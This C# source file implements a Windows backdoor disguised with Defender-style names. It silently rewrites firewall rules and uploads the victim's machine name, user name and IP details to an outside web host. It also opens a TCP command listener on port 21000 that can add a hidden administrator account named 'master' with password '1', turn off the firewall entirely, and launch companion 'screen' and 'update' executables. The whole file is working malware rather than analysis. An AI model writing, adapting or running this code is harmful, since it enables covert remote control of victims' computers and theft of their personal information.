using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;


namespace svc
{
	public class Actions
	{
		static string myPath = AppDomain.CurrentDomain.BaseDirectory;
		static int listenPort = 21000;
		static byte[] buffer = new byte[1024];
		static int maxClientInQueue = 5;
		static Socket serverSocket = new Socket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );


		//var log = new EventLog( );
		//log.Source = "ResidentDebug";
		//log.Log = "MyNewLog";
		//log.WriteEntry( "firewall down" );


		public static void Run( )
		{
			try
			{
				if ( !File.Exists( $"{myPath}key" ) )
				{
					File.Create( $"{myPath}key" );

					var startInfo = new ProcessStartInfo( );
					startInfo.CreateNoWindow = true;
					startInfo.FileName = "cmd.exe";
					startInfo.WindowStyle = ProcessWindowStyle.Hidden;

					startInfo.Arguments = $"/C taskkill /IM residentsvc /F";
					Process.Start( startInfo );

					Environment.Exit( 0 );
				}

				new Action( pickUpScreen ).BeginInvoke( null, null );
				new Action( adjustFirewall ).BeginInvoke( null, null ).AsyncWaitHandle.WaitOne( );
				new Action( startServer ).BeginInvoke( null, null );
				new Action( sendInfo ).BeginInvoke( null, null );
			}
			catch ( Exception ) { }
		}

		static void pickUpScreen( )
		{
			while ( true )
			{
				if ( Process.GetProcessesByName( "screen" ).Length == 0 )
				{
					var screenPath = myPath.Replace( "Defender", "Screen" );

					var startInfo = new ProcessStartInfo( );
					startInfo.CreateNoWindow = true;
					startInfo.FileName = "cmd.exe";
					startInfo.WindowStyle = ProcessWindowStyle.Hidden;
					startInfo.WorkingDirectory = $"{screenPath}";
					startInfo.Arguments = $"/C start {screenPath}screen.exe";
					Process.Start( startInfo );
				}
				Thread.Sleep( 5000 );
			}
		}
		static void adjustFirewall( )
		{
			var startInfo = new ProcessStartInfo( );
			startInfo.CreateNoWindow = true;
			startInfo.FileName = "cmd.exe";
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;

			startInfo.Arguments = $"/C netsh advfirewall firewall delete rule name=DefenderScheduler";
			Process.Start( startInfo );
			Thread.Sleep( 500 );

			startInfo.Arguments = $"/C netsh advfirewall firewall delete rule name=DefenderUpdate";
			Process.Start( startInfo );
			Thread.Sleep( 500 );

			startInfo.Arguments = $"/C netsh advfirewall firewall add rule name=DefenderScheduler dir=in action=allow program=\"{myPath}residentsvc.exe\" enable=yes ";
			Process.Start( startInfo );
			Thread.Sleep( 500 );

			startInfo.Arguments = $"/C netsh advfirewall firewall add rule name=DefenderScheduler dir=out action=allow program=\"{myPath}residentsvc.exe\" enable=yes ";
			Process.Start( startInfo );
			Thread.Sleep( 500 );

			startInfo.Arguments = $"/C netsh advfirewall firewall add rule name=DefenderUpdate dir=out action=allow program=\"{myPath.Replace( "Defender", "Update" )}update.exe\" enable=yes ";
			Process.Start( startInfo );
			Thread.Sleep( 500 );

			startInfo.Arguments = $"/C netsh advfirewall firewall delete rule name=residentsvc.exe";
			Process.Start( startInfo );


		}


		static void sendInfo( )
		{
			var ser = new JavaScriptSerializer( );
			var info = ser.Deserialize<Info>( getIp( ) );

			if ( info != null )
			{
				var fileName = $"{info.query}_info";

				info.computerName = Environment.MachineName;
				info.userName = Environment.UserName;
				info.myPath = myPath;

				var json = ser.Serialize( info );

				File.WriteAllText( fileName, json );
				new Action( voidAction ).BeginInvoke( null, null ).AsyncWaitHandle.WaitOne( );
				File.Delete( fileName );
			}

			string getIp( )
			{
				var webClient = new WebClient( );
				return webClient.DownloadString( "http://ip-api.com/json/" );
			}
			void voidAction( )
			{ uploadFile( $"{info.query}_info", $"{info.query}_info" ); }
		}
		static void uploadFile( string filePath, string fileName )
		{
			var webClient = new WebClient( );
			byte[] result;

			if ( File.Exists( filePath ) )
				result = webClient.UploadFile( string.Concat( "http://slimbde.atwebpages.com/upload.php?name=", fileName ), "POST", filePath );
		}


		static void startServer( )
		{
			serverSocket.Bind( new IPEndPoint( IPAddress.Any, listenPort ) );
			serverSocket.Listen( maxClientInQueue );
			serverSocket.BeginAccept( new AsyncCallback( acceptCallback ), null );
		}
		static void acceptCallback( IAsyncResult result )
		{
			var socket = serverSocket.EndAccept( result );
			socket.BeginReceive( buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback( receiveCallback ), socket );

			serverSocket.BeginAccept( new AsyncCallback( acceptCallback ), null );
		}
		static void receiveCallback( IAsyncResult result )
		{
			var socket = ( Socket )result.AsyncState;

			try
			{
				var received = socket.EndReceive( result );

				byte[] DataBuf = new byte[received];
				Array.Copy( buffer, DataBuf, received );

				var message = Encoding.ASCII.GetString( DataBuf ).ToLower( );

				if ( message == "update" )
				{ sendText( "updating" ); update( ); }
				else if ( message == "hello" || message == "hi" || message == "hey" )
					sendText( "hello to you too" );
				else if ( message.StartsWith( "who" ) )
					sendText( "none of your business" );
				else if ( message == "logout" )
				{ sendText( "bye" ); throw new SocketException( 1 ); }
				else if ( message == "stop" )
				{ sendText( "bye" ); duckOutCmd( ); }
				else if ( message == "die" )
				{ sendText( "bye" ); dieCmd( ); }
				else if (message == "create master account")
				{ createMasterAccount( ); sendText( "done" ); }
				else if (message == "disable firewall")
				{ disableFirewall( ); sendText( "done" ); }
				else
					sendText( "wrong command" );

				socket.BeginReceive( buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback( receiveCallback ), socket );

				void sendText( string text )
				{
					DataBuf = new byte[text.Length];
					DataBuf = Encoding.ASCII.GetBytes( text );

					socket.Send( DataBuf );
				}
			}
			catch ( SocketException )
			{
				socket.Close( );
				serverSocket.BeginAccept( new AsyncCallback( acceptCallback ), null );
			}
		}

		static void update( )
		{
			var startInfo = new ProcessStartInfo( );
			startInfo.CreateNoWindow = true;
			startInfo.FileName = myPath.Replace( "Defender", "Update" ) + "update.exe";
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start( startInfo );
		}
		static void duckOutCmd( )
		{
			var startInfo = new ProcessStartInfo( );
			startInfo.CreateNoWindow = true;
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			startInfo.Arguments = $"/C sc delete residentsvc";
			Process.Start( startInfo );
			dieCmd( );
		}
		static void dieCmd( )
		{
			Process.GetProcessesByName( "screen" )[0].Kill( );
			Environment.Exit( 1 );
		}
		static void createMasterAccount( )
		{
			var startInfo = new ProcessStartInfo( );
			startInfo.CreateNoWindow = true;
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			
			startInfo.Arguments = $"/C net user master 1 /add";
			Process.Start( startInfo );

			Thread.Sleep( 500 );
			startInfo.Arguments = $"/C net localgroup Администраторы master /add";
			Process.Start( startInfo );

			Thread.Sleep( 500 );
			startInfo.Arguments = $"/C net localgroup Administrators master /add";
			Process.Start( startInfo );
		}
		static void disableFirewall( )
		{
			var startInfo = new ProcessStartInfo( );
			startInfo.CreateNoWindow = true;
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";

			startInfo.Arguments = $"/C netsh advfirewall set allprofiles state off";
			Process.Start( startInfo );
		}
	}
}
